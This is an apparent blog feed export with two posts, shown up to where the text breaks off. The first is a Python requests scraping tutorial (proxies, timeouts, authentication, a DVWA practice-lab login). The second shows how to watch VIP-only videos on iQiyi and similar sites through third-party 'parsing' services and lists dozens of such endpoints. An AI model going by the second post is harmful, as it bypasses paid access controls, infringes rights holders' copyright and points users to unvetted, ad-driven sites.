<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.12306.cn&#x27;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;urllib3&#x2F;connectionpool.py:852: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https:&#x2F;&#x2F;urllib3.readthedocs.io&#x2F;en&#x2F;latest&#x2F;advanced-usage.html#ssl-warnings</span><br><span class="line">  InsecureRequestWarning)</span><br><span class="line">200</span><br></pre></td></tr></table></figure>
<p>不过我们发现报了一个警告，它建议我们给它指定证书。我们可以通过设置忽略警告的方式来屏蔽这个警告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;, verify&#x3D;False)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>
<p>或者通过捕获警告到日志的方式忽略警告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import logging</span><br><span class="line">import requests</span><br><span class="line">logging.captureWarnings(True)</span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;, verify&#x3D;False)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>
<p>当然，我们也可以指定一个本地证书用作客户端证书，这可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;, cert&#x3D;(&#39;&#x2F;path&#x2F;server.crt&#39;, &#39;&#x2F;path&#x2F;key&#39;))</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>
<p>当然，上面的代码是演示实例，我们需要有 crt 和 key 文件，并且指定它们的路径。注意，本地私有证书的 <code>key</code> 必须是解密状态，加密状态的 <code>key</code> 是不支持的</p>
<h1 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h1><div class="note info simple"><p>我们爬网站的时候可能和被目标网站屏蔽，我们就可以用代理</p>
</div> 

<div class="note info simple"><p>可以用<code>proxies</code> 参数</p>
</div> 



<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><div class="note info simple"><p>下面用的我用的机场来演示的</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305081421077.png" alt="image-20210305081421077"></p>
<p>演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置代理格式是键值对的方式</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://192.168.31.122:8889&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https&quot;</span>: <span class="string">&quot;https://192.168.31.122:8889&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>, proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出状态码</span></span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305080647647.png" alt="image-20210305080647647"></p>
<div class="note info simple"><p>如果带验证的话可以这样写</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置代理格式是键值对的方式</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://用户名:密码@192.168.31.122:8889&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https&quot;</span>: <span class="string">&quot;https://用户名:密码@192.168.31.122:8889&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>, proxies=proxies)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><div class="note info simple"><p>安装SOCKS代理命令<code>pip3 install &#39;requests[socks]&#39;</code></p>
</div> 

<div class="note info simple"><p>下面用的我用的机场来演示的</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305081503172.png" alt="image-20210305081503172"></p>
<p>演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置代理格式是键值对的方式</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://192.168.31.122:1089&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>, proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出状态码</span></span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305081823179.png" alt="image-20210305081823179"></p>
<h1 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h1><div class="note info simple"><p>有的时候网页不好我们就可以用这个超时参数来设置超时时间</p>
</div> 
<div class="note info simple"><p>代码 ，下面我时间我</p>
</div> 
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.taobao.com&quot;</span>, timeout =<span class="number">0.1</span>)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests.exceptions.ConnectTimeout: HTTPSConnectionPool(host&#x3D;&#39;www.baidu.com&#39;, port&#x3D;443): Max retries exceeded with url: &#x2F; (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x7f8435c35990&gt;, &#39;Connection to www.baidu.com timed out. (connect timeout&#x3D;0.1)&#39;))</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我设置3秒就不会报错了</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.taobao.com&quot;</span>, timeout =<span class="number">3</span>)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210307153227154.png" alt="image-20210307153227154"></p>
<div class="note info simple"><p>如果想永久等待，可以直接将 timeout 设置为 None，或者什么都不加</p>
</div> 
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>, timeout=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h1><div class="note info simple"><p>下面的内容是我复制的书上的应为我没有这个环境</p>
</div> 

<p>在访问网站时，我们可能会遇到这样的认证页面，如图 3-9 所示。</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/3-9.jpg" alt="img">图 3-9 认证页面</p>
<p>此时可以使用 requests 自带的身份认证功能，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost:5000&#39;, auth&#x3D;HTTPBasicAuth(&#39;username&#39;, &#39;password&#39;))</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>如果用户名和密码正确的话，请求时就会自动认证成功，会返回 200 状态码，如果认证失败，则返回 401 状态码。</p>
<p>当然，如果参数都传一个 <code>HTTPBasicAuth</code> 类，就显得有点烦琐了，所以 requests 提供了一个更简单的写法，可以直接传一个元组，它会默认使用 <code>HTTPBasicAuth</code> 这个类来认证。</p>
<p>所以上面的代码可以直接简写如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost:5000&#39;, auth&#x3D;(&#39;username&#39;, &#39;password&#39;))</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
<p>此外，requests 还提供了其他认证方式，如 OAuth 认证，不过此时需要安装 oauth 包，安装命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests_oauthlib</span><br></pre></td></tr></table></figure>
<p>使用 OAuth1 认证的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from requests_oauthlib import OAuth1</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.twitter.com&#x2F;1.1&#x2F;account&#x2F;verify_credentials.json&#39;</span><br><span class="line">auth &#x3D; OAuth1(&#39;YOUR_APP_KEY&#39;, &#39;YOUR_APP_SECRET&#39;,</span><br><span class="line">              &#39;USER_OAUTH_TOKEN&#39;, &#39;USER_OAUTH_TOKEN_SECRET&#39;)</span><br><span class="line">requests.get(url, auth&#x3D;auth)</span><br></pre></td></tr></table></figure>
<p>更多详细的功能可以参考 requests_oauthlib 的官方文档 <a href="https://requests-oauthlib.readthedocs.org/%EF%BC%8C%E5%9C%A8%E6%AD%A4%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%E4%BA%86">https://requests-oauthlib.readthedocs.org/，在此不再赘述了</a></p>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><div class="note info simple"><p>数据结构发送，这个数据结构就叫 Prepared Request。</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义url地址</span></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义POST请求内容</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头的内容</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数构造了一个Request对象</span></span><br><span class="line">req = Request(<span class="string">&#x27;POST&#x27;</span>, url, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 Session 的 prepare_request() 方法将其转换为一个 Prepared Request 对象</span></span><br><span class="line">prepped = Session().prepare_request(req)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 send() 方法发送请求</span></span><br><span class="line">r = Session().send(prepped)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出返回的内容</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;11&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;53.0.2785.116 Safari&#x2F;537.36&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-60441e6c-448862e32841f2ea798f9859&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;120.194.193.184&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更多在官方文档里面<a href="http://docs.python-requests.org/">http://docs.python-requests.org/</a></p>
<h1 id="实战登录网页"><a href="#实战登录网页" class="headerlink" title="实战登录网页"></a>实战登录网页</h1><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>我就登录一下靶场DVWA</p>
</div> 

<div class="note info simple"><p>我们先查看一下他的POST的参数，我故意密码输入错误</p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210228154218409.png" alt="image-20210228154218409"></p>
<p>下面这个就是POST的请求参数</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210228154340242.png" alt="image-20210228154340242"></p>
<p>内容是<code>username=admin&amp;password=a&amp;Login=Login&amp;user_token=b5ac2d72b51b99c325a33189b8858922</code></p>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>全站视频解析技术</title>
    <url>/2021/08/26/wyy/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>现在看视频的真的越来越坑了比如某奇艺，某讯视频，某酷视频，真的越来越无底线vip</p>
</div>

<div class="note info simple"><p>现在我们商丘疫情还是非常严重的出不去，在家闲着没事就在写一个解析视频的一个项目</p>
<p>现在互联网有很多的解析地址免费提供的比如：麻花，秒播吧，天空资源，番茄资源，还有很多的Github开源的视频解析的项目，他们很多都是通过广告获利</p>
</div>

<div class="note danger simple"><p>演示</p>
</div>

<div class="note danger simple"><p>给你看一下怎么免费播放各大vip视频的下面就用某奇艺来演示一下</p>
<p>我随便播放一个视频某奇艺的战狼</p>
</div>

<p>播放地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.iqiyi.com&#x2F;v_19rre19on4.html?vfm&#x3D;2008_aldbd&amp;fc&#x3D;828fb30b722f3164&amp;fv&#x3D;p_02_01</span><br></pre></td></tr></table></figure>
<div class="note danger simple"><p>可以看见只能播放6分钟</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210828184320531.png" alt="image-20210828184320531"></p>
<div class="note danger simple"><p>我们就可以用视频解析网站进行解析，其实很简单只要叫视频放到链接的后面就可以了</p>
</div>

<p>我随便用一个解析地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jx.youyitv.com&#x2F;?url&#x3D;视频链接地址</span><br></pre></td></tr></table></figure>
<p>想这样叫播放战狼的地址访到后面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jx.youyitv.com&#x2F;?url&#x3D;https:&#x2F;&#x2F;www.iqiyi.com&#x2F;v_19rre19on4.html?vfm&#x3D;2008_aldbd&amp;fc&#x3D;828fb30b722f3164&amp;fv&#x3D;p_02_01</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210828185501549.png" alt="image-20210828185501549"></p>
<p>分享在网上找了几个解析地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解析接口地址：http:&#x2F;&#x2F;jx.quanmingjiexi.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">腾讯直解无广告通用：https:&#x2F;&#x2F;vip.52jiexi.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告解析：https:&#x2F;&#x2F;jx.lfeifei.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">秒播无广告解析：https:&#x2F;&#x2F;api.steak517.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告解析：http:&#x2F;&#x2F;api.steak517.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTP接口：http:&#x2F;&#x2F;api.yueliangjx.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTPS接口：https:&#x2F;&#x2F;api.yueliangjx.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告解析：https:&#x2F;&#x2F;jx.elwtc.com&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">秒播无广告解析：https:&#x2F;&#x2F;api.78sy.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTP接口：http:&#x2F;&#x2F;www.2ajx.com&#x2F;vip.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTPS接口：https:&#x2F;&#x2F;www.2ajx.com&#x2F;vip.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用HTTP接口：http:&#x2F;&#x2F;api.steak517.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用HTTPS接口：https:&#x2F;&#x2F;api.steak517.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;vip.ikjiexi.top&#x2F;api&#x2F;?url&#x3D; 无广告，速度也还行</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.kpezp.cn&#x2F;jlexi.php?url&#x3D; 速度挺快的*还带记忆播放</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.8bjx.cn&#x2F;?url&#x3D; 秒播吧 记忆</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.f41.cc&#x2F;?url&#x3D; 速度还可以</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;v.nmbaojie.com&#x2F;mingri&#x2F;mingri.php?url&#x3D;速度还行</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.ckmov.vip&#x2F;api.php?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.ejiafarm.com&#x2F;dy.php?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.youyitv.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jiexi.xueshi.pro</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;z1.m1907.cn&#x2F;?jx&#x3D; 小卡</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.618g.com&#x2F;?url&#x3D; 速度一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.1717yun.com&#x2F;jx&#x2F;ty.php?url&#x3D; 速度还可以</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;cdn.yangju.vip&#x2F;k&#x2F;?url&#x3D; 一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;vip.jaoyun.com&#x2F;index.php?url&#x3D; 还可以</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.618g.com&#x2F;?url&#x3D; 还可以</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.myxin.top&#x2F;jx&#x2F;api&#x2F;?url&#x3D; 腾讯直解 缓存挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jiexi.071811.cc&#x2F;jx.php?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.wslmf.com&#x2F;?url&#x3D; 还行就是 不带缓存要拉快进的注意了</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.dy-jx.com&#x2F;?url&#x3D; 打不开</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;vip.mpos.ren&#x2F;v&#x2F;?url&#x3D;黑屏</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jqaaa.com&#x2F;jx.php?url&#x3D; 速度挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.598110.com&#x2F;index.php?url&#x3D; 速度还可以</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.bwcxy.com&#x2F;?v&#x3D; 速度还可以</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.rdhk.net&#x2F;?v&#x3D; 速度一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.fo97.cn&#x2F;?url&#x3D; 好像不能用</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.ivito.cn&#x2F;?url&#x3D; 一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.927jx.com&#x2F;vip&#x2F;?url&#x3D;一般般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.tv920.com&#x2F;vip&#x2F;?url&#x3D;很一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.lhh.la&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.sumingys.com&#x2F;index.php?url&#x3D; 很一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;cn.bjbanshan.cn&#x2F;jx.php?url&#x3D;挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.mw0.cc&#x2F;?url&#x3D;挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.33tn.cn&#x2F;?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.1ff1.cn&#x2F;?url&#x3D; 还行</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.000180.top&#x2F;jx&#x2F;?url&#x3D; 一般</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;py.ha12.xyz&#x2F;sos&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jiexi.380k.com&#x2F;?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.wslmf.com&#x2F;?url&#x3D; 挺快的</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;okjx.cc&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.662820.com&#x2F;xnflv&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.lldyy.net&#x2F;svip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.82190555.com&#x2F;index&#x2F;qqvod.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jiexi.92fz.cn&#x2F;player&#x2F;vip.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jiexi.071811.cc&#x2F;jx2.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.wlzhan.com&#x2F;sudu&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;beaacc.com&#x2F;api.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;qxkkk.bid&#x2F;jx&#x2F;jx.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.27v9.cn&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.ckplayer.tv&#x2F;kuku&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;o8ve.cn&#x2F;1&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.xyingyu.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.kt111.top&#x2F;jx&#x2F;mf&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.pangujiexi.com&#x2F;player.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.lvcha2017.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;kkk.2016ve.cn&#x2F;kkjx&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;mlxztz.com&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.aktv.men&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jy777.cn&#x2F;XSD&#x2F;XSD&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.visaok.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.xyingyu.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.greatchina56.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.618g.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.baiyug.vip&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.jfysz.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.ektao.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.reclose.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.eayn.org.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.xyingyu.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.iaeec.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.83y4n7a.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.cmbzzs.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.greatchina56.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.as19811.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.sdjnd09.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.baiyug.vip&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.09876as.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.17ktv.com.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.ab78a.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span 